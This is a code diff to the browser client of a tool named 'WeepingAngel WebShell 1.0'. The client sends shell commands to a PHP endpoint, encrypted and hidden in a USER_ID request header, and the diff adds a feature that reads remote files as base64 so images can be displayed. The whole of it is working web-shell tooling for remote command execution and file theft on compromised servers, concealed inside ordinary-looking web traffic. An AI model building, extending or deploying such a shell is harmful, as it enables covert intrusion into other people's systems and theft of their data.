@@ -13,7 +13,7 @@
             background-color: black;
         }
         .terminal, span {
-            --size: 1.4;
+            --size: 1.2;
         }
     </style>
     <body>
@@ -59,13 +59,17 @@
                         var copyCommand = command;
                         command = "cd " + currentPath + ";"+ command;
                         if (copyCommand.startsWith("cd "))
-                        command = command + ";pwd";
+                            command = command + ";pwd";
+
+                        if (copyCommand.startsWith("pic ") || copyCommand.startsWith("eog ")) {
+                            command = "cat " + command.substr(3) + " | base64";
+                        }
                         
                         var key = getRandomValue();
                         var payload = "Ufejiwek"  + CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(key + encryptCommand(command, key)))
 
                         var xhr = new XMLHttpRequest();
-                        xhr.open("POST", "../weepingAngel.php", true); // For testing ../weepingAngel.php else ""
+                        xhr.open("POST", "", true); 
                         xhr.setRequestHeader("USER_ID", payload);
                         xhr.onreadystatechange = function() {
                             if (this.readyState != 4) return;
@@ -78,6 +82,20 @@
                                 if (copyCommand.startsWith('cd ')) {
                                     outputLen = outputLen -1; // Skip last reserved output.
                                     currentPath = response[response.length -1];
+                                }
+
+                                // If we requested a picture.
+                                if (copyCommand.startsWith("pic ") || copyCommand.startsWith("eog ")) {
+
+                                    // Doesn't work, fix later...
+                                    var pictureData = "";
+                                    for (var i = 0; i < outputLen; i++)
+                                        pictureData += response[i];
+
+                                    const img = $('<img src="data:image/png;base64, ' + pictureData +'"/>');
+                                    console.log(img);
+                                    terminal.echo(img);
+                                    return;
                                 }
 
                                 for (var i = 0; i < outputLen; i++)
@@ -98,7 +116,7 @@
                             break;
                         }
                         case "help": { 
-                            this.echo("WeepingAngel WebShell 1.0\n\nhelp  ?  author  exit\nclear $(any current installed command)")
+                            this.echo("WeepingAngel WebShell 1.0\n\nhelp  ?  author  exit\nclear $(any current installed command)\npic  vid")
                             break;
                         }
                         case "author":  {
